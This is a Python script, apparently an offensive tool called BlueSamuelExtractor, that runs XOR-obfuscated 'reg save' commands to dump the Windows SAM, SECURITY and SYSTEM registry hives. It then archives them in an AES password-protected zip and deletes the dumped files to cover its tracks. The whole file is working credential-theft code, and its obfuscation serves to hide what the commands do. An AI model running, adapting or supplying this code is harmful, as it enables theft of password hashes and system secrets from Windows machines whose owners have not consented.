import subprocess
import pyzipper
import sys

# The obfuscation is basic bitwise operation with the actual index+2

# The obfuscated commands
command_array_creation=["pge\"qctg\"JINO^Q[QVGO\"Q[QVGO,jkt", "qfd#pbuf#KHON_PF@VQJWZ#PF@VQJWZ-kju", "vac$wera$LOHIXWEI$WEI*lmr"]
command_array_removal=["del SYSTEM.HIV", "del SECURITY.HIV", "del SAM.HIV"]

class SAMuel:
    def set_password(self,password):
        self.password = password
    def set_archive_type(self,archive_type):
        self.archive_type = archive_type
    def set_archive_name(self,archive_name):
        self.archive_name = archive_name
    def get_password(self):
        return self.password
    def get_archive_type(self):
        return self.archive_type
    def get_archive_name(self):
        return self.archive_name

def extract():
    for index in range (0,len(command_array_creation),1):
        
        # Deobfuscate the command
        command = ''.join(chr(ord(c) ^ index+2) for c in command_array_creation[index])
        print(command)
        # Execute the command
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

def archive(samuel_instane):
    # Create a password protected archive file
    with pyzipper.AESZipFile(samuel_instane.get_archive_name(),'w',compression=pyzipper.ZIP_DEFLATED,encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(samuel_instane.get_password().encode("utf-8"))
        zf.write('SYSTEM.HIV')
        zf.write('SECURITY.HIV')
        zf.write('SAM.HIV')

def removal():
    # Remove the registry imports
    for index in range (0,len(command_array_removal),1):
        
        # Execute the command
        result = subprocess.run(command_array_removal[index], shell=True, capture_output=True, text=True)

def help():
    print("Usage of the BlueSamuelExtractor.py")
    print("-----------------------------------")
    print("BlueSamuelExtractor.py [ARCHIVE TYPE] [ARCHIVE NAME] [PASSWORD]")
    print("-----------------------------------")

def main():
    args = sys.argv[1:]
    if(0 == len(args) or 3 < len(args)):
        help()
        sys.exit("Missing input parameters!")

    samuel_instane = SAMuel()

    samuel_instane.set_archive_type(args[0])
    samuel_instane.set_archive_name(args[1])
    samuel_instane.set_password(args[2])

    extract()
    archive(samuel_instane)
    removal()

if __name__ == "__main__":
    main()
